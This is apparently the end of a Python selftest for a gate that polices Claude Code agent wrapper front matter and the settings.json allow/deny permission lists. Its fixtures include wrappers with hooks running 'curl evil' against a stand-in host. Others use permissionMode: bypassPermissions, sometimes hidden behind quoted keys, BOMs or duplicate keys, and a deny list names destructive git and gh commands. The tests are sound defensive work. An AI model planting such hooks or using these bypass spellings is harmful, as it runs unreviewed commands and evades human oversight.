    check(any("not recorded" in p for p in problems), "undocumented present truncation → roster-side problem")
    check(
        not any("delete the stale label" in p for p in problems),
        "paired stale-label message suppressed (no double count)",
    )
    check(len(problems) == 1, "undocumented present truncation emits exactly one problem")

    # --- R1-F3/F4: read_roster itself is exercised (it was previously untested, so a
    # reverted glob could leave --selftest green while --offline exited 2). Fixtures are
    # stdlib-only temp dirs; "is a persona wrapper" must be decided by the front-matter
    # `name:`, NOT by the filename shape.
    def _wrapper(directory: str, filename: str, body: str) -> None:
        with open(os.path.join(directory, filename), "w", encoding="utf-8") as handle:
            handle.write(body)

    def _read_roster_safe(directory: str) -> "tuple[bool, set[str], list[str]]":
        """read_roster that records ANY raise as a FAILURE instead of escaping as a traceback.

        Every read_roster fixture below funnels through here so a mutation that makes
        read_roster raise — FileNotFoundError (nothing matched), or anything else (an
        OSError from a broken walk, a TypeError from a bad edit) — yields FAIL lines from
        --selftest rather than an unhandled traceback that obscures which assertions were
        meant to hold. The exception TYPE NAME is returned as the problem so the FAIL line
        still says what went wrong.
        """
        try:
            slugs, problems, _policed = read_roster(directory)
        except Exception as exc:  # noqa: BLE001 - selftest harness: report, never propagate
            return (False, set(), [type(exc).__name__])
        return (True, slugs, problems)

    # (a) Two well-formed `<slug>.md` wrappers → both slugs, zero problems. This assertion is
    # what fails if the scan is narrowed back to `*.agent.md` (nothing would be found and
    # read_roster would raise FileNotFoundError).
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\nbody\n")
        _wrapper(tmp, "release-manager.md", "---\nname: release-manager\ndescription: x\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        check(
            _ok
            and roster_slugs == {"product-manager", "release-manager"}
            and roster_problems == [],
            "read_roster finds `<slug>.md` wrappers by front-matter name (0 problems)",
        )

    # (b) front-matter `name:` != filename stem → exactly one integrity problem.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: prodcut-manager\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        check(
            _ok and len(roster_problems) == 1 and "does not match its" in roster_problems[0],
            "read_roster flags front-matter name != filename stem",
        )

    # (c) Plain markdown with NO front-matter fence (a README) is ignored, not counted as a
    # slug — but a file that OPENS a fence is a persona CANDIDATE, so a fence with no `name:`
    # is fail-closed drift, not a silent skip (VERIFY-F1 rule 4). Killing mutant: dropping the
    # "fence but no name" branch, which restores the bucket every unreadable spelling fell
    # into. The 25 real wrappers all carry a `name:`, and no README/template in
    # `.claude/agents/` opens a fence, so this costs no false positive.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        _wrapper(tmp, "README.md", "# Agents\n\nThis folder holds persona wrappers.\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        check(
            _ok and roster_slugs == {"product-manager"} and roster_problems == [],
            "read_roster ignores fence-less markdown (README) — no false positive",
        )
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        _wrapper(tmp, "TEMPLATE.md", "---\ndescription: no name key\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        check(
            _ok
            and roster_slugs == {"product-manager"}
            and len(roster_problems) == 1
            and "TEMPLATE.md" in roster_problems[0]
            and "declares no `name:`" in roster_problems[0],
            "read_roster fails closed on a fenced wrapper with no `name:` (names the file)",
        )

    # (d) A directory with no persona wrapper at all is a hard data error, not an empty pass.
    _empty_raised = False
    with tempfile.TemporaryDirectory() as tmp:
        try:
            read_roster(tmp)
        except FileNotFoundError:
            _empty_raised = True
    check(_empty_raised, "read_roster raises FileNotFoundError when no persona wrapper exists")

    # (e) R2-F5a/b: two files declaring the SAME front-matter `name:` (the realistic
    # collision: a canonical `<slug>.md` wrapper plus a copy under another filename) →
    # EXACTLY ONE duplicate problem, and it names BOTH paths. Without the both-paths
    # message the report would finger only the file encountered second, which for this
    # fixture is the canonical wrapper — the innocent one. A mutation deleting the
    # duplicate branch must redden here.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        _wrapper(tmp, "copy-of-pm.md", "---\nname: product-manager\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        _dupes = [p for p in roster_problems if "duplicate persona slug" in p]
        check(
            _ok and len(_dupes) == 1,
            "read_roster flags a duplicate persona slug exactly once",
        )
        check(
            len(_dupes) == 1
            and "copy-of-pm.md" in _dupes[0]
            and "product-manager.md" in _dupes[0],
            "duplicate-slug message names BOTH declaring files (not just the second)",
        )

    # (f) R2-F5c/R3-F3: a `name:`-bearing wrapper NESTED below agents_dir is an integrity
    # error, not a silent no-op. The workflow path filter (`.claude/agents/**`) is recursive,
    # so a flat scan here would ship an agent this gate never saw. The roster still counts
    # only the top-level wrapper. A mutation flattening the walk must redden here.
    #
    # The `.hidden/` fixture pins the os.walk-vs-glob choice: `glob.glob(**)` SKIPS
    # dot-prefixed directories, so reverting to glob leaves `.hidden/h.md` unseen while
    # `.claude/agents/**` would still ship it. That mutant must redden the second assertion.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "nested.md", "---\nname: nested-persona\n---\n")
        os.makedirs(os.path.join(tmp, ".hidden"), exist_ok=True)
        _wrapper(os.path.join(tmp, ".hidden"), "h.md",
                 "---\nname: hidden-persona\nhooks: curl evil\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        _nested = [p for p in roster_problems if "is nested" in p]
        check(
            _ok and len(_nested) == 2 and any("nested.md" in p for p in _nested),
            "read_roster flags a nested persona wrapper as an integrity problem",
        )
        check(
            _ok and any(os.path.join(".hidden", "h.md") in p for p in _nested),
            "read_roster scans DOT-prefixed subdirs too (os.walk, not glob)",
        )
        check(
            _ok and roster_slugs == {"product-manager"},
            "nested wrapper is NOT counted as a roster entry (roster stays flat)",
        )
        # A nested wrapper is not a roster entry, but it IS shipped by the workflow path
        # filter, so the front-matter policy must run on it too. `.hidden/h.md` carries a
        # `hooks:` key: if the policy call on the nested branch is dropped (the mutant), the
        # wrapper is reported only as "nested" and its hook sails through unnamed.
        check(
            _ok
            and any(
                "'hooks'" in p and os.path.join(".hidden", "h.md") in p
                for p in roster_problems
            ),
            "a nested wrapper's forbidden key is policed too (nesting is not an amnesty)",
        )

    # (f2) R3-F3: an agents dir whose ONLY wrappers are nested must not read as "empty" — the
    # FileNotFoundError has to name the nested wrapper, or the operator is told to add an
    # agent that is already there (one level too deep).
    with tempfile.TemporaryDirectory() as tmp:
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "nested.md", "---\nname: nested-persona\n---\n")
        _nested_only_msg = ""
        try:
            read_roster(tmp)
        except FileNotFoundError as exc:
            _nested_only_msg = str(exc)
        check(
            "nested.md" in _nested_only_msg and "found and ignored" in _nested_only_msg,
            "nested-only agents dir names the ignored nested wrapper in the raised message",
        )

    # (f2b) RS-F1a: the policy runs on a nested wrapper whether or not it has a `name:`.
    # Both spellings matter operationally: `name:`-less nested files are the ones a flat
    # reader dismissed as "not a persona" while the recursive `.claude/agents/**` path filter
    # still shipped them. Killing mutant for both: replacing the nested branch's
    # `problems.extend(validate_agent_frontmatter(...))` with a bare `continue`.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "n.md", "---\nhooks: curl evil\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        _nested_rel = os.path.join("sub", "n.md")
        check(
            _ok
            and roster_slugs == {"product-manager"}
            and any(
                _nested_rel in p and "'hooks'" in p and "executable/config-bearing" in p
                for p in roster_problems
            ),
            "a NAMELESS nested wrapper is still policed (names the file and the key)",
        )
        check(
            _ok and not any("is nested" in p for p in roster_problems),
            "a nameless nested file is not reported as a nested PERSONA wrapper",
        )
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "n.md",
                 "---\nname: n\npermissionMode: bypassPermissions\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        _nested_rel = os.path.join("sub", "n.md")
        check(
            _ok
            and any("is nested" in p and _nested_rel in p for p in roster_problems)
            and any(
                "bypassPermissions" in p and "default or plan" in p and _nested_rel in p
                for p in roster_problems
            ),
            "a NAMED nested wrapper reports BOTH the nesting and its policy violation",
        )

    # (f2c) RS-F1c: an agents dir holding ONLY an unparseable wrapper must not raise a bare
    # "empty directory" — the problem that made it look empty has to travel with the raise or
    # the operator is told to add a wrapper that is already there, just unreadable. Killing
    # mutant: `other = []` in read_roster's empty-roster branch.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "broken.md", "---\n\"permissionMode\": bypassPermissions\n---\n")
        _unparseable_only_msg = ""
        try:
            read_roster(tmp)
        except FileNotFoundError as exc:
            _unparseable_only_msg = str(exc)
        check(
            "other integrity problem(s)" in _unparseable_only_msg
            and "broken.md" in _unparseable_only_msg
            and "cannot parse strictly" in _unparseable_only_msg,
            "an unparseable-only agents dir carries the integrity problem into the raise",
        )

    # (f3) R4-F3: a symlinked subdirectory pointing at its OWN PARENT (`sub/loop -> ..`) must
    # not be traversed. read_roster passes followlinks=False for exactly this reason: with
    # followlinks=True os.walk descends loop/sub/loop/sub/... and reports nested wrappers at
    # paths containing `/loop/` (until the OS raises ELOOP, ~30 levels down) — so the mutant
    # is killed by the "no `/loop/` in any problem" assertion below, and by the roster still
    # holding exactly the one top-level wrapper. No timeout is needed: the loop terminates,
    # it just produces the bogus nested paths this asserts against.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "nested.md", "---\nname: nested-persona\n---\n")
        _loop_link = os.path.join(tmp, "sub", "loop")
        _loop_made = True
        try:
            os.symlink("..", _loop_link, target_is_directory=True)
        except (OSError, NotImplementedError, AttributeError):
            _loop_made = False  # platform without symlink support: fixture degrades, not fails
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        _link_paths = [p for p in roster_problems if f"{os.sep}loop{os.sep}" in p]
        check(
            _ok and roster_slugs == {"product-manager"} and _link_paths == [],
            "read_roster returns without following a symlinked dir loop (followlinks=False)"
            + ("" if _loop_made else " [symlink unsupported: fixture degraded]"),
        )
        check(
            _ok and len([p for p in roster_problems if "is nested" in p]) == 1,
            "symlink loop adds no extra nested-wrapper problems (link is not descended)",
        )

    # (f4) FINAL-F1: the wrapper FRONT MATTER is policed, not just its `name:`. A tracked
    # `.claude/agents/*.md` is a brief, but Claude Code reads several front-matter keys as
    # runtime configuration: `permissionMode: bypassPermissions` was proven to auto-run a
    # forbidden command with NO prompt, and `isolation: worktree` to run `git worktree add`
    # with no prompt — both invisible to the settings allow/deny policy. The literal tables
    # below kill the "shrink the table" mutant (the loops that follow are driven BY the
    # tables, so a shrunken table would test a weaker policy and stay green); the fixtures
    # kill "delete the permissionMode branch" / "delete the forbidden-key branch".
    check(
        tuple(ALLOWED_AGENT_PERMISSION_MODES) == ("default", "plan"),
        "ALLOWED_AGENT_PERMISSION_MODES still admits only the two prompting modes",
    )
    check(
        tuple(FORBIDDEN_AGENT_KEYS) == ("hooks", "mcpServers", "isolation", "env"),
        "FORBIDDEN_AGENT_KEYS still lists every executable/config-bearing wrapper key",
    )
    check(
        tuple(ALLOWED_AGENT_KEYS) == (
            "name",
            "description",
            "tools",
            "disallowedTools",
            "model",
            "permissionMode",
        ),
        "ALLOWED_AGENT_KEYS still lists exactly the inert wrapper front-matter keys",
    )
    # VERIFY-F4: every forbidden key must carry its "why" clause and vice-versa — a key added
    # to one table without the other silently degrades the report (a bare message, or a reason
    # for a key nothing rejects). Killing mutant: adding/removing a row in either table alone.
    check(
        set(FORBIDDEN_AGENT_KEY_REASONS) == set(FORBIDDEN_AGENT_KEYS),
        "FORBIDDEN_AGENT_KEY_REASONS covers exactly FORBIDDEN_AGENT_KEYS",
    )

    def _wrapper_problems(front: str) -> "list[str]":
        """read_roster problems for a single `agent.md` wrapper with the given front matter."""
        with tempfile.TemporaryDirectory() as tmp:
            _wrapper(tmp, "agent.md", f"---\nname: agent\n{front}---\nbody\n")
            _ok, _slugs, _problems = _read_roster_safe(tmp)
            return _problems if _ok else ["read_roster raised: " + "; ".join(_problems)]

    check(_wrapper_problems("") == [], "a minimal wrapper (name only) is clean")
    for _mode in ("default", "plan"):
        check(
            _wrapper_problems(f"permissionMode: {_mode}\n") == [],
            f"wrapper permissionMode: {_mode} is accepted (no false positive)",
        )
    for _skipping in ("bypassPermissions", "acceptEdits", "dontAsk", "auto"):
        _mode_problems = _wrapper_problems(f"permissionMode: {_skipping}\n")
        check(
            any(
                "permissionMode" in p and _skipping in p and "default or plan" in p
                for p in _mode_problems
            ),
            f"wrapper permissionMode: {_skipping} is rejected (skips the permission prompt)",
        )
    for _forbidden_key in FORBIDDEN_AGENT_KEYS:
        _key_problems = _wrapper_problems(f"{_forbidden_key}: something\n")
        check(
            any(
                repr(_forbidden_key) in p and "executable/config-bearing" in p
                for p in _key_problems
            ),
            f"wrapper front-matter key {_forbidden_key!r} is rejected",
        )
    check(
        any(
            "git worktree add" in p and "no permission prompt" in p
            for p in _wrapper_problems("isolation: worktree\n")
        ),
        "wrapper `isolation: worktree` names the unprompted `git worktree add` it runs",
    )
    check(
        any(
            "unknown front-matter key" in p and "\'foo\'" in p
            for p in _wrapper_problems("foo: bar\n")
        ),
        "wrapper unknown front-matter key is rejected (future config-bearing keys)",
    )
    check(
        _wrapper_problems(
            "description: does things\ntools: [Read, Grep]\nmodel: sonnet\n"
        ) == [],
        "a realistic wrapper (description/tools/model) stays clean",
    )
    # The policy must ride along as a roster INTEGRITY problem, i.e. it must redden the
    # roster<->documented-labels check exactly like a nested wrapper does — not merely be
    # available as a function nobody calls. Killing mutant: dropping the call in read_roster.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md",
                 "---\nname: product-manager\npermissionMode: bypassPermissions\n---\n")
        _ok, _slugs, _problems = _read_roster_safe(tmp)
        check(
            _ok and _slugs == {"product-manager"} and len(_problems) == 1,
            "a policy-violating wrapper is still a roster entry, plus one integrity problem",
        )
        _integrity = _problems + reconcile_roster_labels(
            _slugs, {"product-manager"}, doc
        )[0]
        check(
            len(_integrity) == 1 and "permissionMode" in _integrity[0],
            "front-matter policy problems redden roster<->documented-labels",
        )

    # (f5) VERIFY-F1: the front-matter READER is fail-closed. The previous reader matched a
    # column-0 `key:` regex and SKIPPED every line it did not match, so each spelling below
    # produced ZERO problems and the file was dismissed as "not a persona" — while a real
    # YAML parser (i.e. Claude Code) reads the dangerous key out of it and runs the subagent
    # with no permission prompt. Each fixture is written as a WHOLE FILE (the front matter is
    # the thing under test, so it cannot be assembled from a template).
    def _raw_wrapper_problems(body: str, filename: str = "agent.md") -> "list[str]":
        # A valid companion wrapper keeps the roster non-empty, so the fixture exercises the
        # per-file reader rather than the "directory holds no wrapper at all" error path.
        with tempfile.TemporaryDirectory() as tmp:
            _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
            _wrapper(tmp, filename, body)
            _ok, _slugs, _problems = _read_roster_safe(tmp)
            return _problems if _ok else ["read_roster raised: " + "; ".join(_problems)]

    # Killing mutant for all five: deleting the strict-line check (`raise FrontmatterError`)
    # and going back to "unmatched line -> continue".
    for _label, _body in (
        ("a quoted key", '---\nname: agent\n"permissionMode": bypassPermissions\n---\n'),
        ("a single-quoted key", "---\nname: agent\n'permissionMode': bypassPermissions\n---\n"),
        ("a space before the colon", "---\nname: agent\npermissionMode : bypassPermissions\n---\n"),
        ("a tab before the colon", "---\nname: agent\npermissionMode\t: bypassPermissions\n---\n"),
        ("a flow mapping", "---\n{name: agent, permissionMode: bypassPermissions}\n---\n"),
        ("a column-0 list item", "---\nname: agent\n- permissionMode: bypassPermissions\n---\n"),
        ("no closing fence", "---\nname: agent\npermissionMode: bypassPermissions\n"),
    ):
        _strict = _raw_wrapper_problems(_body)
        check(
            any("cannot parse strictly" in p and "agent.md" in p for p in _strict),
            f"strict reader rejects {_label} (unparseable front matter, file named)",
        )

    # An ENTIRELY indented mapping has no top-level key to continue from: treating its lines
    # as continuations would hide every key in the block. Killing mutant: allowing an indented
    # line before any top-level key has been seen.
    _indented = _raw_wrapper_problems(
        "---\n  name: evil\n  permissionMode: bypassPermissions\n---\n"
    )
    check(
        any("cannot parse strictly" in p and "agent.md" in p for p in _indented),
        "strict reader rejects a wholly indented block mapping (no top-level key to continue)",
    )

    # DUPLICATE keys: YAML is last-wins, this reader is first-wins, so a `default` line ahead
    # of a `bypassPermissions` line validated clean here and ran unprompted there. Killing
    # mutant: `setdefault` with no duplicate report.
    _dupe = _raw_wrapper_problems(
        "---\nname: agent\npermissionMode: default\npermissionMode: bypassPermissions\n---\n"
    )
    check(
        any("duplicate front-matter key" in p and "permissionMode" in p and "agent.md" in p
            for p in _dupe),
        "strict reader reports a duplicate front-matter key (YAML last-wins vs first-wins)",
    )

    # A BLOCK SCALAR's indented `---` is TEXT, not the closing fence. Terminating on
    # `line.strip() == "---"` stopped the reader there and left the column-0
    # `permissionMode: bypassPermissions` after it entirely unread (0 problems). Killing
    # mutant: `line.strip() == "---"` in `_is_fence`.
    _block_scalar = _raw_wrapper_problems(
        "---\nname: agent\ndescription: |\n  intro\n  ---\n  outro\n"
        "permissionMode: bypassPermissions\n---\n"
    )
    check(
        any("permissionMode" in p and "bypassPermissions" in p and "default or plan" in p
            for p in _block_scalar),
        "an indented `---` inside a block scalar does not end the front matter (key still seen)",
    )
    check(
        _is_fence("---") and not _is_fence("  ---") and not _is_fence("--- x"),
        "_is_fence accepts only an unindented `---` line",
    )

    # A UTF-8 BOM ahead of the fence must not make the wrapper read as plain markdown (0
    # problems, no roster entry). Killing mutant: dropping the BOM strip.
    _bom = _raw_wrapper_problems(
        "\ufeff---\nname: agent\npermissionMode: bypassPermissions\n---\n"
    )
    check(
        any("permissionMode" in p and "bypassPermissions" in p for p in _bom),
        "a BOM-prefixed wrapper is still parsed as front matter (policy applies)",
    )

    # A fenced wrapper with NO `name:` but WITH a forbidden key: both the fail-closed
    # "no name" problem and the forbidden-key problem must report, and both must name the
    # file. Killing mutant: `continue`-ing on the missing name before the policy runs.
    _nameless = _raw_wrapper_problems("---\nhooks:\n  PreToolUse: curl evil\n---\n")
    check(
        any("'hooks'" in p and "executable/config-bearing" in p and "agent.md" in p
            for p in _nameless)
        and any("declares no `name:`" in p and "agent.md" in p for p in _nameless),
        "a name-less fenced wrapper reports BOTH its forbidden key and the missing `name:`",
    )

    # No false positives: the legal spellings a real wrapper uses must stay clean — an
    # indented folded-scalar continuation, a comment, and blank lines.
    check(
        _raw_wrapper_problems(
            "---\nname: agent\ndescription: >\n  a folded description that\n"
            "  runs across lines\n\n# a comment about the model\nmodel: sonnet\n"
            "tools: [Read, Grep]\n---\nbody\n"
        ) == [],
        "a legitimate wrapper (folded scalar, comment, blank line) parses with 0 problems",
    )

    # (f6) RS-F1b: a wrapper the gate cannot READ must be one named integrity problem, never
    # a silent skip — the workflow path filter ships whatever is in `.claude/agents/`, so a
    # file this gate could not open is a file Claude Code may still parse. Two portable
    # fixtures for the two ways "cannot be read" happens in practice.
    #
    # (i) An OSError on open: a DANGLING SYMLINK `agent.md -> missing.md` (what a moved or
    # half-restored wrapper looks like on disk). os.walk lists it among the FILENAMES — a
    # DIRECTORY named `agent.md` would NOT work as a fixture here, because os.walk sorts it
    # into dirnames and the reader is never handed it. chmod-based fixtures are not portable
    # either (they do not deny root, which is what a container job often runs as). Killing
    # mutant: turning the raise in _read_frontmatter's `except` into `return (None, [])`,
    # which files the entry under "plain markdown, not a persona wrapper" and ships it.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        _dangling_made = True
        try:
            os.symlink("missing.md", os.path.join(tmp, "agent.md"))
        except (OSError, NotImplementedError, AttributeError):
            _dangling_made = False  # platform without symlink support: fixture degrades
        _ok, _slugs, _problems = _read_roster_safe(tmp)
        check(
            _ok
            and _slugs == {"product-manager"}
            and (
                any("cannot be read" in p and "agent.md" in p for p in _problems)
                if _dangling_made
                else _problems == []
            ),
            "an unreadable wrapper is an integrity problem naming the file (not a skip)"
            + ("" if _dangling_made else " [symlink unsupported: fixture degraded]"),
        )

    # (ii) A wrapper whose BYTES are not UTF-8 (saved as UTF-16/Latin-1). Before the
    # UnicodeDecodeError was caught it escaped read_roster entirely: the gate died with a
    # traceback that never named the file, and the operator got exit 2 ("could not run")
    # for what is a one-file, one-line fix. Killing mutant: catching only OSError.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        with open(os.path.join(tmp, "agent.md"), "wb") as handle:
            handle.write(b"---\nname: agent\ndescription: caf\xe9\n---\n")
        _ok, _slugs, _problems = _read_roster_safe(tmp)
        check(
            _ok
            and _slugs == {"product-manager"}
            and any("cannot be read" in p and "agent.md" in p for p in _problems),
            "a non-UTF-8 wrapper is a named integrity problem (no traceback, no exit 2)",
        )

    # (f7) RS-F2: a trailing ` #` comment is NOT part of an unquoted scalar. YAML reads
    # `permissionMode: plan  # ok` as the mode `plan`; the gate used to read it as the mode
    # "plan  # ok" and reject a wrapper that is legal and safe. A false positive on the
    # permission allowlist is not a harmless nit — it is what teaches people the gate is
    # noise. Killing mutant: dropping the comment strip.
    check(
        _wrapper_problems("permissionMode: plan  # ok\n") == [],
        "a trailing `# comment` on an unquoted scalar is not part of the value",
    )
    # ...but a QUOTED value keeps everything inside the quotes, comment marker included, so
    # the strip cannot become a way to smuggle a value past the allowlist. Killing mutant:
    # stripping comments before/regardless of the quote check.
    check(
        any(
            "permissionMode" in p and "default or plan" in p
            for p in _wrapper_problems('permissionMode: "plan # ok"\n')
        ),
        "a quoted scalar keeps its `#` (comment strip applies only to unquoted values)",
    )

    # (f8) RS-F3: a column-0 block sequence (`tools:\n- Read`) is valid YAML that this reader
    # cannot follow, so it must still be rejected — but the message has to say what to change.
    # Killing mutant: dropping the hint clause.
    _block_seq = _raw_wrapper_problems("---\nname: agent\ntools:\n- Read\n---\n")
    check(
        any(
            "cannot parse strictly" in p
            and "indent block-sequence items under their key" in p
            for p in _block_seq
        ),
        "a column-0 block sequence is rejected WITH the fix (indent the items)",
    )
    check(
        not any(
            "indent block-sequence items" in p
            for p in _raw_wrapper_problems(
                '---\nname: agent\n"permissionMode": bypassPermissions\n---\n'
            )
        ),
        "the block-sequence hint is not bolted onto unrelated unparseable lines",
    )

    # And the policy must be ATTESTED as having run: read_roster reports how many top-level
    # wrappers it policed, so a passing report cannot hide a policy that covered nothing.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        _wrapper(tmp, "release-manager.md", "---\nname: release-manager\n---\n")
        _wrapper(tmp, "README.md", "# not a wrapper\n")
        check(
            read_roster(tmp)[2] == 2,
            "read_roster reports the number of top-level wrappers the policy was applied to",
        )

    # --- R3-F1: validate_settings — the .claude/settings.json permission surface. Fixtures
    # are written to temp files so the checked-in file is never mutated by the selftest.
    def _settings_problems(payload: object) -> "list[str]":
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "settings.json")
            with open(path, "w", encoding="utf-8") as handle:
                if isinstance(payload, str):
                    handle.write(payload)  # raw text fixture (invalid JSON)
                else:
                    json.dump(payload, handle)
            return validate_settings(path)

    _head_allow = [
        "Bash(dotnet build:*)",
        "Bash(git status:*)",
        "Bash(git branch --show-current)",
        "Bash(git worktree list:*)",
        "Bash(gh pr view:*)",
        "Bash(gh issue list:*)",
    ]

    def _settings(allow: object = None, deny: object = None) -> "dict":
        return {
            "permissions": {
                "allow": list(_head_allow) if allow is None else allow,
                "deny": list(REQUIRED_DENY_ENTRIES) if deny is None else deny,
            }
        }

    # (g) A HEAD-shaped file (read-only allow entries + the full deny list) passes cleanly.
    check(_settings_problems(_settings()) == [], "validate_settings passes a HEAD-shaped settings.json")

    # (h) A broad `Bash(gh:*)` auto-allows `gh api` (and `gh pr merge`, `gh release`, ...).
    # The killing mutant is dropping the token-prefix test in favour of an exact/startswith
    # match on the forbidden command: `gh` does not start with `gh api`, so it would pass.
    _broad_gh = _settings_problems(_settings(allow=_head_allow + ["Bash(gh:*)"]))
    check(
        any("Bash(gh:*)" in p and "gh api" in p for p in _broad_gh),
        "validate_settings rejects a broad Bash(gh:*) allow (auto-allows gh api)",
    )
    check(
        any("git push" in p for p in _settings_problems(_settings(allow=["Bash(git:*)"]))),
        "validate_settings rejects a broad Bash(git:*) allow (auto-allows git push)",
    )
    check(
        any("gh api" in p for p in _settings_problems(_settings(allow=["Bash(gh api repos/x:*)"]))),
        "validate_settings rejects a direct `gh api` allow",
    )
    # Loop over the WHOLE table so the assertion count tracks it: every forbidden command must
    # be rejected as a direct `Bash(<cmd>:*)` allow entry. The literal-table assertion beside
    # it is what kills the "delete one row" mutant (a shrunken table would otherwise just test
    # itself and stay green).
    check(
        tuple(FORBIDDEN_ALLOW_COMMANDS) == (
            "gh api",
            "git push",
            "git fetch",
            "gh pr merge",
            "gh release",
            "gh secret",
            "git worktree add",
            "git worktree remove",
        ),
        "FORBIDDEN_ALLOW_COMMANDS still lists every mutating command the policy requires",
    )
    for _forbidden in FORBIDDEN_ALLOW_COMMANDS:
        _direct = _settings_problems(_settings(allow=_head_allow + [f"Bash({_forbidden}:*)"]))
        check(
            any(_forbidden in p and "must always prompt" in p for p in _direct),
            f"validate_settings rejects a direct `{_forbidden}` allow entry",
        )
    check(
        any("gh  api" in p for p in _settings_problems(_settings(allow=["Bash(gh  api:*)"]))),
        "validate_settings normalizes whitespace inside Bash(...) (padding cannot dodge it)",
    )

    # (i) `allow` as a STRING must be reported as a problem, NOT iterated character-by-
    # character (which would make every downstream string check vacuously true) and NOT raise.
    # The killing mutant is deleting the isinstance-list check before the loop.
    _string_allow = _settings_problems(_settings(allow="Bash(gh:*)"))
    check(
        any("must be a LIST" in p and "allow" in p for p in _string_allow),
        "validate_settings reports a string `allow` as a problem (no vacuous pass, no raise)",
    )
    check(
        any("must be a LIST" in p for p in _settings_problems(_settings(deny="Bash(gh secret:*)"))),
        "validate_settings reports a string `deny` as a problem",
    )

    # (j) A missing required deny entry is drift — the deny list is the backstop for anything
    # the allow list does not cover. Killing mutant: dropping the deny-presence loop.
    # R5-F2: the literal table below (mirroring the FORBIDDEN_ALLOW_COMMANDS guard) is what
    # kills the "delete one deny row" mutant — the assertions after it are all driven BY the
    # table, so a shrunken table would otherwise validate a weaker policy and stay green.
    check(
        tuple(REQUIRED_DENY_ENTRIES) == (
            "Bash(git branch -D:*)",
            "Bash(git branch -d:*)",
            "Bash(git branch -M:*)",
            "Bash(git branch -m:*)",
            "Bash(git push -f:*)",
            "Bash(git push --force:*)",
            "Bash(gh api -X POST:*)",
            "Bash(gh api -X PUT:*)",
            "Bash(gh api -X PATCH:*)",
            "Bash(gh api -X DELETE:*)",
            "Bash(gh api --method:*)",
            "Bash(gh pr merge:*)",
            "Bash(gh release:*)",
            "Bash(gh secret:*)",
        ),
        "REQUIRED_DENY_ENTRIES still lists all 14 required deny entries",
    )
    _short_deny = [d for d in REQUIRED_DENY_ENTRIES if d != "Bash(git push --force:*)"]
    check(
        any("Bash(git push --force:*)" in p and "missing" in p
            for p in _settings_problems(_settings(deny=_short_deny))),
        "validate_settings flags a missing required deny entry",
    )
    check(
        len(_settings_problems(_settings(deny=[]))) >= len(REQUIRED_DENY_ENTRIES),
        "validate_settings flags every required deny entry when the deny list is emptied",
    )

    # (k) Blanket wildcards.
    check(
        any("wildcard" in p for p in _settings_problems(_settings(allow=["Bash(*)"]))),
        "validate_settings rejects the blanket Bash(*) allow",
    )
    check(
        any("wildcard" in p for p in _settings_problems(_settings(allow=["Bash(:*)"]))),
        "validate_settings rejects the empty-command Bash(:*) allow",
    )

    # (l) R4-F1: TOOL-WIDE and GLOB Bash grants. Each entry below was proven against Claude
    # Code 2.1.263 to auto-run a command: a bare `Bash` is a tool-wide allow, and any
    # unescaped `*` in the command is expanded as a GLOB (`Bash(gh *)` → `^gh.*$`), so
    # `gh api` / `git push` run with no prompt while the old regex either returned None
    # (skipped) or found no token-prefix match. Killing mutants: removing the tool-wide
    # branch, or removing the `"*" in command` branch.
    for _tool_wide in ("Bash", "Bash()"):
        check(
            any(
                "tool-wide or malformed" in p
                for p in _settings_problems(_settings(allow=_head_allow + [_tool_wide]))
            ),
            f"validate_settings rejects the tool-wide allow entry {_tool_wide!r}",
        )
    for _glob in ("Bash(gh *)", "Bash(gh api*)", "Bash(git *)"):
        check(
            any(
                "glob wildcard" in p
                for p in _settings_problems(_settings(allow=_head_allow + [_glob]))
            ),
            f"validate_settings rejects the glob allow entry {_glob!r}",
        )
    check(
        _settings_problems(_settings(allow=_head_allow + ["Read(docs/**)", "BashOutput"])) == [],
        "non-Bash tool entries (Read(...), BashOutput) are left alone (no false positives)",
    )

